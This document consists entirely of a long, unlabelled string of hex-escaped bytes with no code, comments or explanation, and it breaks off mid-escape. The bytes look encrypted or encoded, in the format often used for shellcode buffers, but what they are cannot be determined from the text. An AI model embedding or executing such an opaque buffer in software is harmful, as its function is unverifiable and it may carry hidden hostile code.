\x59\xde\x72\x25\x6a\x53\xc3\x8a\x24\xf7\x91\x49\x62\x74\x0b\xfa\x07\x72\x08\x1f\x0a\x09\x8b\x6c\x76\x4d\x34\xa5\x4b\x38\xd5\xf0\x13\xaa\x24\x9d\x32\x79\xff\x2e\xd8\x35\xa0\xcf\x1e\x7a\x9f\xbe\x91\x56\x4a\xe3\xe2\xdf\x5d\xbc\x50\xe1\x9e\x4b\xb0\x03\x31\x30\x83\x14\xc2\xbd\xd2\xd3\xa3\x62\xe6\x2d\x1b\x71\xab\x83\xce\x3f\x3f\x9b\xb0\xa7\x2a\xc9\x55\x2c\x54\xdf\xbb\xa9\xd9\x26\x79\xab\xb5\x5a\x8a\xc1\x11\xf2\x71\x0e\x20\xbd\x04\x4f\x23\x55\x24\x3f\x1f\x23\x15\x43\x5d\x60\x8d\x8e\x0b\x79\x37\x67\xbb\xd8\xfd\x53\x3b\xfc\x03\xe5\xf2\xaf\xa7\xba\x32\x0a\x90\xf5\x71\x19\xdc\xb1\x4d\x7f\x4e\xab\xf3\x44\xba\x42\xa9\x47\x9d\xc9\x17\x6c\x6d\x27\x05\x6b\xed\x43\x25\xc3\x8f\x12\xf1\xcb\x8a\x27\x4f\x9d\x1b\x5b\x80\xc5\x2a\xb6\xa0\x60\xb1\x8d\xa7\x6d\x9b\xff\xc1\xee\x0f\x81\x40\xca\xea\x0e\xcd\x6e\x4b\x95\x55\x3b\x39\xe0\x29\xc4\xfa\xa5\x9d\xf4\x1e\xac\x7f\x93\x91\xd5\x59\xe3\xe0\x97\x39\xe3\x49\xcd\xec\x63\x8d\xdc\xe4\x57\x64\xad\xf6\xd5\x61\xaf\x71\xbe\x0e\x53\x2b\x3a\x76\xd9\x27\x9e\xc6\xa9\x37\x93\x78\xa9\xba\xa4\x3b\x7c\xc2\x1f\xbd\x3f\xe1\x4e\x48\x1e\xd6\xdd\xcf\xc0\x02\xea\x9e\x6e\xa0\x07\x0e\x4a\x56\xc2\x3b\x6c\x09\x16\x91\x93\xdc\x64\x42\xd7\x80\xdf\xd4\x4a\x8f\xb8\xdb\x97\x33\x97\x3a\x8b\x9f\xf0\x3f\xce\x1a\x96\x9f\xb3\x8d\x1c\x22\x3b\x7c\x27\x99\x60\x92\xb7\x1f\xea\xb3\x69\x81\x58\xbd\x3a\xfb\x2c\xcf\x0a\x86\x4a\x3c\x45\x4c\x2a\xca\x1a\x6a\x52\x02\xe6\xf8\x80\x3b\xc3\xe6\xac\x34\x4f\xea\x9f\x56\xa7\xc0\x92\xdf\x40\x41\x2c\xb7\xf9\xad\x93\x71\x4f\xff\x59\x4d\x49\x6c\x08\x8f\xbb\x55\x28\x82\x74\x23\x67\xea\x25\x6f\x41\xf4\x71\x15\xe0\x76\x59\xa7\x19\xdb\xb6\x07\xc1\x1e\xa8\x30\x13\xed\x44\xf4\x4e\x0a\xd6\x12\xc5\x12\x4f\xd9\x16\x9f\x80\xcb\xc9\x13\x91\x20\xaa\x4b\x2f\x5c\x09\xfa\x3a\x9f\x04\xe9\xe8\x73\xed\xb8\x13\x4b\xda\x4a\xb7\x53\xe9\x54\x13\x49\x4a\x27\xc6\x0f\x1f\x72\xf8\x73\x1c\x71\x4b\x9e\xa7\x5c\x32\xa5\x70\x03\xdc\x0a\x73\x23\x2c\xeb\xe4\xb9\xe4\x69\xdb\x7a\x5d\x91\x3a\xa1\x0e\x7e\x85\x6e\xc6\x3c\x8a\x1e\x34\x5a\x31\x18\x58\x19\x14\x53\x56\xdc\xe9\x90\x37\xc2\xce\xdf\xfa\x69\xd9\x60\x9b\x17\x4a\xbf\xd6\x89\x27\xe3\xdf\x16\x88\xb3\x25\xfa\xf7\x02\xe0\x71\x18\xc9\xfe\x5b\x4f\xf8\x37\xdb\x3c\x2a\x7b\xf3\x1b\x8c\x1f\x07\x0a\xb7\x28\xb5\x71\x1a\x26\x89\x8e\xc1\x91\x3c\x49\x44\xd0\x93\x24\xd3\x76\x46\x89\x83\xbc\x6f\x3a\x81\xec\x95\x01\x82\x05\xab\x22\x71\x74\x6c\x73\xee\xec\x62\xf8\x9e\x7a\x00\x8f\x20\xc6\x8b\xf8\xd3\x1c\x11\xbc\x7e\xfb\x55\x1b\xb8\xda\x11\xcb\x88\xcf\xd5\xfa\xbf\xa8\x7e\x06\x0a\x75\xb7\x57\x18\xd2\xf0\x09\x9a\x46\x5f\x7c\x69\x18\x6c\x70\xd1\x36\x7f\x9b\x12\x6c\xe7\x21\x94\xcf\x31\x02\x27\xae\xa5\xde\x18\x41\xd9\xdf\x74\x92\x9a\x97\xdc\x76\x15\x18\x23\x3c\xca\xe8\x78\x29\x83\xc3\x7c\x16\xf5\xb3\xba\xc1\xf9\x02\xa1\xb6\x8e\x1e\x3d\x86\xff\x27\x4a\x28\x4e\x51\x38\xa4\xd9\x0c\x13\xe6\xaf\x74\x56\xfd\xd1\x33\x28\x0e\x1d\xb1\x80\x57\x5f\x42\x9f\x7e\x74\xe2\x2a\xff\xbb\xb7\xf8\x9e\x16\x47\xe2\xc4\xe1\xc0\x09\x9e\x0e\x40\x29\x7c\x13\x73\x02\xd8\xff\xd3\xcc\xe3\x6f\x92\xf7\x70\x5f\x3a\x50\x7f\xc5\x6f\x24\x26\x70\x09\x04\x3c\x33\x1c\x33\x86\x18\x10\x48\x13\xff\xbb\x3c\x1a\x49\xf9\x42\x81\xf3\xda\x31\xdc\x4c\xca\xf5\x48\x13\x67\x7a\x24\xbc\x3f\x80\x2a\xbb\xa0\x53\x5c\xf9\x74\x4e\x83\x75\x6b\x18\xda\x3d\xe3\xa8\x13\xdd\xc2\xdf\x70\xee\x8e\x4a\x65\x07\xa7\x98\x82\x84\xe9\xba\x92\x3f\xf4\xe9\x28\x04\xb8\xe1\x9e\x1f\x8b\x72\xcc\x9b\x39\x54\xab\x39\x7a\x27\xf6\x65\x36\x08\xb1\x29\x8f\x14\xa2\xd6\x27\xdc\x3a\xe5\x40\x43\x3c\xf2\xe0\xf8\x61\xa3\x13\xfc\x36\x21\xab\x7a\x45\x41\x8a\xa1\xfe\x0e\x66\xad\x66\x2f\x77\x6a\x78\xc2\x51\xd8\xb0\xb9\x04\xd3\x56\x37\xbc\x66\xc5\x91\xa3\x08\x2e\x71\x69\x20\xb3\xc7\xfa\x7f\x86\xf4\x3a\x2a\x3f\x8b\xe7\xf8\x0e\xf2\x37\x42\xa8\xb1\xe8\x49\xde\x66\x38\x79\x44\x53\x43\xe2\xd8\x2b\xab\x8c\x47\xb7\xda\x37\x58\xaf\x42\x00\xff\xd5\xbf\x44\x36\xa4\xa9\x44\xe8\xf3\x14\x93\x76\xa0\x98\x88\xcb\x3f\x2b\x3c\xda\x1d\xd1\x82\x1d\x5b\x52\xf1\xa4\x9c\x62\x25\x38\x43\x97\x1a\xb4\xb8\x8f\x60\x0e\x4b\xc8\xd3\x3c\x01\x6c\x1e\x6b\x55\xbb\x78\x1a\x09\x1b\x48\x77\xc5\x4a\xff\xd8\x3e\x16\x8a\x75\x17\x77\x18\x72\x98\xa9\x5a\x9e\x3f\x6c\x69\x18\x7c\x40\xf1\xa6\xff\x7b\xd2\xec\xef\x31\x94\x27\x61\xb2\x27\x9e\xc5\x0e\xf8\x81\xb9\xbf\xb4\x72\xd2\x57\x5c\xfe\x15\xe8\x63\xdc\x3a\x18\x78\xf9\x83\x63\x7c\x96\x6d\xc3\xba\x69\x69\xd2\xa1\xe6\x6e\xae\x1d\x66\x1f\x47\x8a\x08\x36\x31\xf8\xfc\xb9\xfc\x93\xa6\x9f\x44\x76\x2d\x91\x13\xe8\x0e\xe5\x01\x40\x2f\x4f\x72\x5f\xee\x14\x12\x2a\xdf\x9b\x97\xf8\x3e\x0e\xc7\x22\x0c\xe1\x90\x89\xbe\xde\x70\xc9\x6c\x53\x13\xc2\x18\xf7\xa3\xcc\xcb\xdf\xe2\x77\xe0\xdf\x4a\xb0\x9f\xa5\x8f\x64\x86\x58\x29\x04\x54\xd3\x0c\xf3\x46\x08\x60\xc8\x23\xbf\x9b\x3c\x5a\x91\x89\x42\x59\xe3\x8a\xb1\xcc\x8c\x7a\x55\x88\xb3\x47\xba\x04\x74\x7f\xc0\xf2\x3b\x70\x53\xbc\x29\xa4\xee\xb3\xf5\x0b\xd8\x9a\xf5\x73\x68\x7b\x8d\x92\x1f\xe0\x6e\x9e\xca\xa5\xe7\xc7\x98\xa2\xac\x49\x7a\xea\x5f\xe4\xe9\xe8\xd4\x08\x01\x4e\x1f\x6b\x32\xcc\x63\x09\x54\xc3\xa9\xaa\x27\xa6\xc5\x66\xe8\xb1\x89\x6f\x54\x02\x0e\x27\x5c\x42\xa5\x10\x83\x1c\xa2\x90\xf8\xf1\x23\xb3\xfc\x36\x59\xfb\x7a\xad\x71\xda\xa1\x6e\xae\xf6\x8d\x86\xcf\x97\xaa\xd8\x2a\xf1\x98\x08\xd9\xf4\x53\xd6\xe7\x0c\x86\x35\xd1\x83\xc8\xae\xf9\x79\xe0\x4b\xf7\xaa\x3f\xb6\xd4\x6a\x2a\xdf\xeb\xc7\xf8\x2e\xea\xf7\x82\x70\x71\xb8\xc9\x3e\x76\xe8\x19\xf4\x13\xe3\xa2\x98\xe3\xbb\x8c\xef\xe7\xaa\xb7\x08\xef\x52\x60\x5f\x35\xdf\x84\x16\x0c\x89\x44\x00\xd3\x04\x53\xf6\x50\x68\x08\x1b\x7f\x0b\x3c\x9a\x25\x21\x82\xb5\x8b\x82\x71\x54\x1c\x12\x85\x38\x63\x77\x5a\x14\x70\x0f\xa0\x56\x8b\x98\xd3\xdc\x71\x1c\xbe\x5b\x55\x5b\x38\x5a\x81\xeb\x08\x9f\x35\x9a\x3f\x88\x7e\x26\x0a\xf5\x77\x97\x18\x12\x40\xc9\x1a\xf6\x9f\x5c\x69\x98\x0c\x10\x11\x96\x7f\x5b\x92\x6c\x77\xc1\x94\xff\x11\x62\x27\x0e\x65\x3e\xd8\x41\x99\x9f\xf4\x52\x0a\x97\xdc\x86\x95\xb8\xa3\xfc\x2a\x48\x78\x49\x83\x03\x7c\x16\x65\x53\xba\x91\x59\xa2\xa1\x96\xce\x3e\xfd\xc6\x3f\x67\xca\xe8\x1e\x91\xb8\x54\x19\xec\x13\xe6\x0f\x14\x96\xdd\x51\xf3\xa8\x0e\x2d\xd1\x00\x87\xbf\xa2\x1f\xde\x34\x42\x2a\x3f\x7b\x77\xf8\xde\x06\xc7\x62\x54\x61\x60\x09\x5e\x2e\xa0\x69\xdc\x93\xb3\x82\x58\x6f\xf3\xcc\x33\xcf\x32\xf7\xd0\xdf\x5a\x10\x3f\x85\xaf\xa4\xe6\x40\xc9\x04\x6c\xf3\xfc\xb3\x86\x78\xb0\x48\xb3\x7f\x7b\x3c\x9a\x59\x99\x42\xb1\x53\x3a\x31\x3c\x4c\x2a\xb5\x48\x53\x27\xfa\xe4\x2c\x3f\x00\xba\x3b\x40\x53\x9c\xd9\xd4\x8e\x63\x75\xab\x98\x5a\x2d\x83\x28\x63\xbd\x62\x5f\xd0\x6e\xae\x4a\x65\xc7\xe7\x98\xc2\xd4\x29\x3a\x42\xff\xd4\xe9\x28\x24\x58\x21\x7e\x1f\x4b\xf2\xcc\xab\x59\x54\x5b\x99\xda\x27\xd6\xa5\x96\xc8\x31\xe9\x4f\x94\x62\x46\xa7\xdc\x4a\xe5\xe0\xc3\x7c\xd2\x40\xf8\x01\xa3\x53\xfc\x36\x11\xcb\x7a\x95\x21\x2a\xa1\x5e\xce\x86\x6d\x26\x6f\xb7\xea\x38\x92\x11\x58\x60\x79\xe4\xd3\xd6\x17\x5c\xa6\x25\x11\x63\x88\x2e\x01\x09\xa0\x63\xa7\x5a\xff\x66\x34\x9a\x2a\xff\x4b\xa7\xf8\x4e\xe2\x37\xc2\x38\xb1\x88\x49\x1e\x06\x98\xb9\x24\xd3\x83\x62\x58\x1b\x4b\x8c\x17\x97\x7a\x37\x38\xaf\x62\xc0\x3f\x95\xff\xc4\xf6\x74\xe9\x44\x18\x33\xf4\x13\xf6\x80\x38\x88\xeb\xbf\xeb\x3c\x5a\xad\xf1\x82\xcd\x3b\xb2\xf1\x84\x1c\xc2\xe5\xb8\x83\x57\x9a\x74\x28\x0f\xe0\x9e\x4b\x68\xd3\xfc\x61\xcc\x5e\xcb\x55\xfb\xf8\x9a\x79\x3b\xc8\x47\x25\xea\x7f\xb8\x3e\x36\x8a\xf5\xd7\xb7\x18\xb2\xe8\x69\xda\x4e\x7f\x4c\x69\x98\x1c\xe0\x31\x06\xff\x3b\x52\xec\x7f\xd1\x94\x57\x41\x12\x27\xfe\x85\x6e\xb8\x81\x79\x7f\x34\x32\x42\x57\x5c\x0e\x95\x88\xe3\x9c\x9a\x78\x78\x19\x83\xa3\x7c\x96\xdd\x63\xba\x39\xc9\x72\xa1\xc6\xae\xce\xdd\xa6\x5f\x87\x0a\xc8\x06\x71\x78\xac\xf9\xdc\x93\xa6\xff\xe4\xb6\x0d\x11\xd3\x68\x0e\xf5\x21\xc0\x5f\xaf\xd2\xdf\x4e\xd4\x72\x2a\x1f\x5b\x57\xf8\x7e\xfe\x47\xa2\x9c\x61\x30\x89\x7e\xfe\xd0\x09\xcc\xd3\x53\x42\x98\x67\xc3\xcc\x1b\x3f\x82\x77\x40\x5f\x6a\x70\x5f\x65\xcf\xe4\x46\x28\xe9\x04\x84\x93\xec\x73\x46\x68\x00\xc8\xc3\x3f\x5b\x3c\xda\xa1\x29\x42\x89\x43\xea\xb1\x2c\x8c\xda\x15\x88\xf3\x07\x3a\xc4\xe4\x7f\x40\x82\xbb\x10\x53\xfc\x09\x04\x2e\x93\xf5\x4b\x58\x1a\xe5\x13\xe8\xcb\x6d\x32\x9f\x40\xee\xbe\xca\xa5\xa7\x07\x98\xe2\xfc\x89\xfa\x9a\x1f\xc4\xe9\xe8\xf4\xa8\x41\x2e\x1f\x2b\xb2\xcc\x73\x29\x54\x73\x09\x0a\x27\x86\x05\xc6\xa8\x31\x49\x2f\xd4\xc2\x7e\xa7\x5c\x52\xa5\xb0\x03\x5c\x82\xf0\xf8\x91\x23\xf3\xfc\x36\x49\x1b\x7a\xfd\x51\x7a\xa1\xce\x6e\x16\x4d\x46\x0f\xd7\x2a\x98\xfa\xb1\x18\xb8\x99\xd4\x53\x56\xc7\xac\xc6\x95\x51\x43\x48\xae\x89\x19\x60\xfb\xd7\x0a\xbf\x96\x14\xca\x2a\x9f\xab\x87\xf8\x6e\xda\xf7\x02\x00\x71\x58\xc9\x7e\x16\x48\x59\xd4\x93\x23\x22\x18\xd3\x5b\x8c\xbf\xc7\x4a\xb7\xe8\xef\x72\x20\x9f\xf5\x1f\x04\xd6\xdc\xc9\x44\x30\x13\xe4\xd3\x76\x30\x08\x08\x3b\xff\xcb\x3c\x1a\xb5\x41\x82\x65\x6b\xe2\x71\x34\x9c\x72\x45\xb8\xa3\x37\xda\xd4\xe0\x8f\x20\xe6\x8b\x38\xd3\x9c\xd1\x7c\xfe\xbb\x55\x9b\xb8\xda\xf1\x0b\x88\x6f\x95\x3a\xbf\x68\x7e\x46\x0a\x75\x37\xd7\x18\x52\x90\x89\x9a\xa6\xdf\x3c\x69\x18\xac\xb0\x51\xf6\x7f\x1b\x12\x6c\x07\x61\x94\x2f\xf1\xc2\x27\x6e\x25\x9e\x98\x41\x59\x5f\x74\x12\x7a\x97\xdc\x96\x15\x58\x23\xbc\x8a\xa8\x78\x69\x83\x43\x7c\x16\xd5\xf3\xba\x61\xb9\x42\xa1\x76\x0e\x5e\xbd\x06\x7f\xa7\x4a\xa8\xee\xd1\x38\x04\x59\xcc\x13\xe6\x6f\xb4\xd6\xbd\xd1\xb3\x28\x0e\x3d\xf1\x80\xb7\x1f\x02\x9f\x3e\xf4\xa2\x2a\x7f\x3b\x37\xf8\x1e\xf6\x47\xe2\xe4\xe1\x00\x09\x1e\x4e\x00\xa9\x3c\x13\xf3\x02\xd8\xdf\x13\xcc\x83\x2f\xd2\xf7\x30\x5f\x7a\xd0\xff\x45\xef\x24\xa6\x10\x89\x04\x9c\xb3\xdc\x33\x86\xd8\x50\x48\x53\xff\x3b\x3c\x1a\x69\x39\x42\xe1\xb3\x9a\x31\x9c\x4c\x8a\x75\x48\x93\xe7\x7a\xa4\x9c\x3f\x80\x4a\xbb\xe0\x53\xdc\xb9\x34\xce\x43\x75\xeb\x18\xda\x1d\x23\xa8\xb3\x9d\x02\xdf\x30\xee\xce\x4a\x65\x87\x27\x98\x02\x24\x69\xba\xf2\xbf\xb4\xe9\x28\x44\xf8\x61\x5e\x1f\x0b\x72\xcc\xbb\x79\x54\x0b\xf9\x3a\x27\xb6\xe5\xf6\x88\xb1\xa9\x0f\x14\x22\xb6\x27\xdc\x5a\xe5\x80\x43\xbc\xb2\xa0\xf8\xa1\xa3\x93\xfc\x36\x01\xeb\x7a\xe5\x01\xca\xa1\xbe\x8e\xa6\x2d\xe6\xaf\xf7\x6a\xf8\x62\xd1\xd8\x10\x39\xc4\xd3\x56\xf7\xfc\xe6\x85\x91\x23\x08\x2e\x91\xa9\x20\x13\x87\xba\x7f\x46\x74\xfa\x2a\xbf\x0b\x67\xf8\x8e\xd2\x37\x42\xc8\xb1\x28\x49\x5e\xa6\xf8\xf9\x04\x53\xc3\xe2\xd8\x0b\xeb\x8c\xe7\x77\x1a\x37\x18\xaf\x82\x80\x7f\x55\x3f\x44\xb6\x44\x29\x44\x48\x73\xd4\x93\x76\x60\xd8\x88\x0b\x3f\xab\x3c\xda\x3d\x11\x82\x7d\x1b\x12\xf1\x64\x9c\x22\xa5\x38\xc3\x17\x1a\x34\x98\x8f\x60\x2e\x4b\x08\xd3\xbc\xc1\x2c\x9e\x2b\x55\x3b\x78\x1a\xe9\x5b\x48\x17\x85\x8a\xff\x98\x3e\x56\x8a\x75\x97\xf7\x18\xf2\x38\x29\x5a\xfe\xbf\x2c\x69\x18\xbc\x80\x71\x66\xff\xfb\xd2\xec\x0f\x71\x94\x87\x21\x72\x27\x5e\x45\xce\x78\x81\x39\x3f\xb4\xf2\xb2\x57\x5c\x1e\x15\x28\x63\x5c\xfa\xd8\x78\x39\x83\xe3\x7c\x96\x4d\x03\xba\x09\x29\x12\xa1\xa6\xee\xee\x9d\xe6\x9f\xc7\x8a\x88\xd6\xb1\xf8\x5c\x39\xbc\x93\xa6\x5f\x84\xf6\xed\x91\x93\xe8\x0e\x05\x41\x40\x8f\x0f\x32\x5f\xae\x94\xd2\x2a\x5f\x1b\x17\xf8\xbe\xee\xc7\x22\x2c\xe1\xd0\x89\x3e\x1e\x30\x49\x2c\x53\x93\xc2\x18\xd7\xe3\xcc\x6b\x9f\x22\x77\xa0\xdf\x8a\x30\x1f\x25\x0f\x64\x06\xf8\xa9\x04\xb4\x53\xcc\xf3\x46\xc8\xa0\xc8\x63\xbf\x1b\x3c\x5a\xb1\xc9\x42\xb9\xa3\x4a\xb1\x8c\x8c\x3a\xd5\x88\x33\xc7\xba\x84\x54\x7f\xc0\x12\x3b\xb0\x53\x3c\xe9\x64\x6e\x73\xf5\x8b\xd8\x9a\xd5\xb3\x68\x1b\x4d\xd2\x1f\xa0\x6e\xde\xca\xa5\x67\x47\x98\x22\x4c\xc9\x7a\x4a\xdf\xa4\xe9\xe8\x14\x48\x81\x0e\x1f\xeb\x32\xcc\x83\x49\x54\x23\x69\x6a\x27\x66\x45\x26\x68\xb1\x09\xef\x54\x82\xee\x27\x5c\x62\xa5\x50\x83\x9c\x62\x50\xf8\x31\x23\x33\xfc\x36\x39\x3b\x7a\x4d\x31\x1a\xa1\x2e\x2e\x36\x0d\x06\x4f\x17\xaa\x58\xca\x71\x98\x68\x59\xb4\x53\xd6\xa7\x4c\x06\xf5\xd1\x03\xc8\xae\x19\xb9\xe0\xab\xb7\x6a\x3f\x76\x54\x2a\x2a\x5f\x6b\x47\xf8\xae\xca\xf7\x82\x90\x71\xf8\xc9\xbe\xb6\xa8\x99\xb4\x13\x63\xa2\x98\xc3\xfb\x8c\x8f\xa7\xea\xb7\xc8\xef\x92\xe0\xdf\xb5\x5f\x84\x96\xac\x09\x44\x60\x53\xc4\x53\xf6\x10\xa8\x08\x5b\x7f\x8b\x3c\x9a\x45\x61\x82\x15\x4b\x42\x71\x14\x1c\xd2\x05\x38\xe3\xf7\x5a\x94\x50\x0f\xa0\x76\x8b\xd8\xd3\x5c\x31\xdc\x3e\x1b\x55\xdb\x38\x5a\x61\x2b\x08\x3f\xf5\xda\x3f\x48\x7e\x66\x0a\xf5\xf7\x17\x18\x92\xe0\x49\x1a\x56\x1f\x1c\x69\x98\x4c\x50\x91\x56\x7f\xdb\x92\x6c\x97\x01\x94\x5f\xd1\x22\x27\xce\xe5\xfe\x58\x41\x19\x1f\xf4\xd2\xea\x97\xdc\xa6\x95\xf8\xa3\x7c\xea\x08\x78\x89\x83\x83\x7c\x16\x45\x93\xba\x31\x19\xe2\xa1\x56\x4e\x7e\x7d\x46\xbf\xe7\xca\x68\xbe\x11\xb8\xb4\x99\xac\x13\xe6\xcf\x54\x16\x9d\x51\x73\xa8\x0e\x4d\x11\x00\xe7\x7f\x62\x1f\x9e\xb4\x02\x2a\xbf\xfb\xf7\xf8\x5e\xe6\xc7\x62\x74\x61\xa0\x09\xde\x6e\x60\xe9\x9c\x93\x33\x82\x58\x4f\x33\xcc\xd3\x8f\x72\xf7\x90\xdf\x9a\x90\xbf\x05\x2f\xa4\x66\xe0\x49\x04\xcc\x73\xbc\xb3\x86\x38\xf0\x48\xf3\x7f\xfb\x3c\x9a\x79\xd9\x42\x11\x13\xfa\x31\xfc\x4c\xea\x35\x48\xd3\xa7\xfa\x64\x0c\x3f\x00\xda\x3b\x80\x53\x1c\x99\x94\x0e\x23\x75\x2b\x98\x5a\x0d\xc3\x28\x03\x7d\xa2\x5f\x90\x6e\xee\x4a\x65\x47\x67\x98\x42\x74\xa9\x3a\xa2\x7f\x94\xe9\x28\x64\x98\xa1\x3e\x1f\xcb\xf2\xcc\xcb\x99\x54\xbb\x59\x9a\x27\x96\x25\x56\x48\x31\x69\xcf\x94\xe2\x26\xa7\xdc\x6a\xe5\x20\xc3\xfc\x92\x00\xf8\x41\xa3\xd3\xfc\x36\xf1\x0b\x7a\x35\xe1\x6a\xa1\x1e\x4e\xc6\xed\xa6\xef\x37\xea\xb8\x32\x91\x58\xc0\xf9\xa4\xd3\xd6\xd7\x9c\x26\xe5\x11\xe3\x88\x2e\x21\x49\xa0\xc3\x67\x1a\xff\x26\xb4\x5a\x2a\x7f\xcb\x27\xf8\xce\xc2\x37\xc2\x58\xb1\xc8\x49\x9e\x46\x58\x39\xe4\xd3\x03\x62\x58\xfb\x8b\x8c\xb7\x57\xba\x37\xf8\xaf\xa2\x40\xbf\x15\x7f\xc4\x76\x14\x69\x44\x78\xb3\xb4\x13\xf6\x40\x78\x88\x2b\xbf\x6b\x3c\x5a\xcd\x31\x82\x2d\xfb\x72\xf1\x44\x1c\x82\x65\xb8\x03\xd7\x9a\xf4\x08\x0f\xe0\xbe\x4b\xa8\xd3\x7c\x21\x8c\xde\x8b\x55\x7b\xf8\x9a\x59\x7b\xc8\xe7\xe5\x2a\x7f\x78\x3e\x76\x8a\xf5\x57\x37\x18\x32\x88\xe9\xda\xae\xff\x0c\x69\x98\x5c\x20\xb1\xc6\xff\xbb\x52\xec\x9f\x11\x94\xb7\x01\xd2\x27\xbe\x05\x2e\x38\x81\xf9\xff\x34\xb2\x22\x57\x5c\x2e\x95\xc8\xe3\x1c\x5a\x38\x78\x59\x83\x23\x7c\x96\xbd\xa3\xba\xd9\x89\xb2\xa1\x86\x2e\x0e\x5d\x26\xdf\x07\x0a\x48\xa6\xf1\x78\x0c\x79\x9c\x93\xa6\xbf\x24\x36\xcd\x11\x53\x68\x0e\x15\x61\xc0\xbf\x6f\x92\xdf\x0e\x54\x32\x2a\x9f\xdb\xd7\xf8\xfe\xde\x47\xa2\xbc\x61\x70\x89\xfe\x3e\x90\x89\x8c\xd3\xd3\x42\x98\x47\x03\xcc\xbb\xff\xc2\x77\x00\x5f\xaa\xf0\xdf\xe5\x4f\xe4\xc6\xc8\x69\x04\xe4\x13\xac\x73\x46\x28\x40\xc8\x03\x3f\xdb\x3c\xda\xc1\x69\x42\xe9\x03\xaa\xb1\xec\x8c\x9a\x95\x88\x73\x87\x3a\x44\xc4\x7f\x40\xa2\xbb\x50\x53\x7c\xc9\xc4\xae\x53\xf5\xcb\x58\x1a\xc5\x53\xe8\x6b\x2d\x72\x9f\x00\xee\xfe\xca\xa5\x27\x87\x98\x62\x9c\x09\xfa\xfa\x9f\x84\xe9\xe8\x34\xe8\xc1\xee\x1f\xab\xb2\xcc\x93\x69\x54\xd3\xc9\xca\x27\x46\x85\x86\x28\x31\xc9\xaf\xd4\x42\x5e\xa7\x5c\x72\xa5\xf0\x03\xdc\x42\xb0\xf8\xd1\x23\x73\xfc\x36\x29\x5b\x7a\x9d\x11\xba\xa1\x8e\xee\x56\xcd\xc6\x8f\x57\x2a\x18\x9a\x31\x18\x18\x19\x94\x53\x56\x87\xec\x46\x55\x51\xc3\x48\xae\xa9\x59\x60\x5b\x97\xca\xbf\x56\x94\x8a\x2a\x1f\x2b\x07\xf8\xee\xba\xf7\x02\x20\x71\x98\xc9\xfe\x56\x08\xd9\x94\x93\xa3\x22\x18\xb3\x9b\x8c\x5f\x87\x8a\xb7\xa8\xef\xb2\xa0\x1f\x75\x9f\x04\x56\x7c\x49\x44\x90\x93\xa4\xd3\x76\xf0\x48\x08\x7b\xff\x4b\x3c\x1a\xd5\x81\x82\xc5\x2b\xa2\x71\xf4\x9c\x32\xc5\xb8\x23\xb7\xda\x54\xc0\x8f\x20\x06\x8b\x78\xd3\x1c\x91\x3c\x7e\x7b\x55\x1b\xb8\xda\xd1\x4b\x88\x0f\x55\x7a\xbf\x28\x7e\x86\x0a\x75\xb7\x57\x18\xd2\x30\x09\x9a\x06\x5f\xfc\x69\x18\xec\xf0\xd1\xb6\x7f\x9b\x12\x6c\x27\xa1\x94\x8f\xb1\x82\x27\x2e\xa5\x5e\x18\x41\xd9\xdf\x74\x92\x5a\x97\xdc\xb6\x15\x98\x23\x3c\x4a\x68\x78\xa9\x83\xc3\x7c\x16\xb5\x33\xba\x01\x79\x82\xa1\x36\x8e\x9e\x3d\x86\xff\x27\x4a\x28\x8e\x51\x38\x64\xd9\x8c\x13\xe6\x2f\xf4\x56\x7d\xd1\x33\x28\x0e\x5d\x31\x80\x17\xdf\xc2\x9f\xfe\x74\x62\x2a\xff\xbb\xb7\xf8\x9e\xd6\x47\xe2\x04\xe1\x40\x09\x9e\x8e\xc0\x29\xfc\x13\x73\x02\xd8\xbf\x53\xcc\x23\xef\x12\xf7\xf0\x5f\xba\x50\x7f\xc5\x6f\x24\x26\xb0\x09\x04\xfc\x33\x9c\x33\x86\x98\x90\x48\x93\xff\xbb\x3c\x1a\x89\x79\x42\x41\x73\x5a\x31\x5c\x4c\x4a\xf5\x48\x13\x67\x7a\x24\x7c\x3f\x80\x6a\xbb\x20\x53\x5c\x79\xf4\x4e\x03\x75\x6b\x18\xda\xfd\x63\xa8\x53\x5d\x42\xdf\xf0\xee\x0e\x4a\x65\x07\xa7\x98\x82\xc4\xe9\xba\x52\x3f\x74\xe9\x28\x84\x38\xe1\x1e\x1f\x8b\x72\xcc\xdb\xb9\x54\x6b\xb9\xfa\x27\x76\x65\xb6\x08\xb1\x29\x8f\x14\xa2\x96\x27\xdc\x7a\xe5\xc0\x43\x3c\x72\x60\xf8\xe1\xa3\x13\xfc\x36\xe1\x2b\x7a\x85\xc1\x0a\xa1\x7e\x0e\xe6\xad\x66\x2f\x77\x6a\x78\x02\x51\xd8\x70\xb9\x84\xd3\x56\xb7\x3c\x66\x45\x91\xa3\x08\x2e\xb1\xe9\x20\x73\x47\x7a\x7f\x06\xf4\xba\x2a\x3f\x8b\xe7\xf8\x0e\xb2\x37\x42\xe8\xb1\x68\x49\xde\xe6\xb8\x79\xc4\x53\x43\xe2\xd8\xeb\x2b\x8c\x87\x37\x5a\x37\xd8\xaf\xc2\x00\xff\xd5\xbf\x44\x36\xe4\xa9\x44\xa8\xf3\x94\x93\x76\x20\x18\x88\x4b\x3f\x2b\x3c\xda\x5d\x51\x82\xdd\xdb\xd2\xf1\x24\x9c\xe2\x25\x38\x43\x97\x1a\xb4\x78\x8f\x60\x4e\x4b\x48\xd3\x3c\x81\xec\x1e\xeb\x55\xbb\x78\x1a\xc9\x9b\x48\xb7\x45\xca\xff\x58\x3e\x96\x8a\x75\x17\x77\x18\x72\xd8\xa9\x5a\x5e\x3f\xec\x69\x18\xfc\xc0\xf1\x26\xff\x7b\xd2\xec\x2f\xb1\x94\xe7\xe1\x32\x27\x1e\xc5\x8e\xf8\x81\xb9\xbf\xb4\x72\x92\x57\x5c\x3e\x15\x68\x63\xdc\xba\x98\x78\x79\x83\x63\x7c\x96\x2d\x43\xba\xa9\xe9\x52\xa1\x66\x6e\x2e\x1d\x66\x1f\x47\x8a\x08\x76\x31\xf8\xbc\xb9\x7c\x93\xa6\x1f\xc4\x76\xad\x91\x13\xe8\x0e\x25\x81\x40\xef\xcf\xf2\x5f\x6e\x14\x92\x2a\xdf\x9b\x97\xf8\x3e\xce\xc7\x22\x4c\xe1\x10\x89\xbe\x5e\xf0\xc9\xec\x53\x13\xc2\x18\xb7\x23\xcc\x0b\x5f\x62\x77\x60\xdf\xca\xb0\x9f\xa5\x8f\x64\x86\x98\x29\x04\x14\xd3\x8c\xf3\x46\x88\xe0\xc8\xa3\xbf\x9b\x3c\x5a\xd1\x09\x42\x19\x63\x0a\xb1\x4c\x8c\xfa\x55\x88\xb3\x47\xba\x04\x34\x7f\xc0\x32\x3b\xf0\x53\xbc\xa9\x2